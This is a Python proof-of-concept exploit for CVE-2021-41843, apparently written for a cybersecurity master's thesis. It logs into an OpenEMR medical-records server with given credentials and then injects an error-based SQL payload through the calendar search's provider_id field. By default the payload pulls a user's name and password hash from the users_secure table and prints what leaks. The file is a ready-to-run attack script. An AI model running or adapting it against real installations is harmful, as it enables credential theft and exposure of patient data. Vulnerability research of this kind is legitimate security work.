# TFM: 
# Center: IMF Master Cybersecurity Deloitte Online 
# Author: M3str3 <namestre3@protonmail.com>
# CVE-2021-41843
# CVE Details: https://www.cvedetails.com/cve/CVE-2021-41843/

import requests
import argparse

parser = argparse.ArgumentParser(description="PoC 2021-41843 by M3str3<namestre3@protonmail.com>")
parser.add_argument("-t", "--target", help="IP o dominio destino", required=True)
parser.add_argument("-s", "--ssl", action="store_true", help="Usar HTTPS si estÃ¡ activado")
parser.add_argument("-u", "--user",  help="El nombre de usuario", required=True)
parser.add_argument("-p", "--password", help="La password del usuario", required=True)
parser.add_argument("--payload", default="SELECT CONCAT(username, ':', password) FROM openemr.users_secure WHERE id = 1", help="Payload")
args = parser.parse_args()

protocol = "https" if args.ssl else "http"
url_login = f"{protocol}://{args.target}/interface/main/main_screen.php?auth=login&site=default"
url_exploit = f"{protocol}://{args.target}/interface/main/calendar/index.php?module=PostCalendar&func=search"

def main() -> None:    
    session = requests.Session()

    login_data = {
        "new_login_session_management": 1,
        "authProvider": "Default",
        "authUser": f"{args.user}",
        "clearPass": f"{args.password}",
        "languageChoice": 1
    }

    response_login = session.post(url_login, data=login_data)
    if response_login.url.endswith("login_screen.php"):
        print("[!] Login failed")
    else:
        print("[*] Login successful")

        data = {
            'pc_keywords': 'TRVNT',
            'pc_keywords_andor': 'AND',
            'pc_category': '',
            'start': '01/01/2024',
            'end': '01/01/2024',
            'provider_id': f"(UPDATEXML(1, CONCAT(0x2e, 0x20, ({args.payload})), 1))",
            'pc_facility': '',
            'submit': 'Submit'
        }

        response_exploit = session.post(url_exploit, data=data)

        if "XPATH syntax error" in response_exploit.text:
            # En caso de que lance el error de XPATH imprimira parte de la respuesta de la consulta 
            print("[*] SQL inject succesfully, response:", response_exploit.text)
        else:
            # Si no se lanzo el error de XPATH, es posible que el login no sea correcto
            print("[!] SQL injection failed")
            print("----------------------------")
            print(f"{response_exploit.text}")
            print("----------------------------")

if __name__ == "__main__":
    print("="*60)
    print(" " * 10 + "Proof of Concept - CVE-2021-41843")
    print(" " * 10 + "IMF Master Ciberseguridad Deloitte Online")
    print(" " * 10 + "Autor: M3str3 <namestre3@protonmail.com>")
    print("="*60)
    
    main()
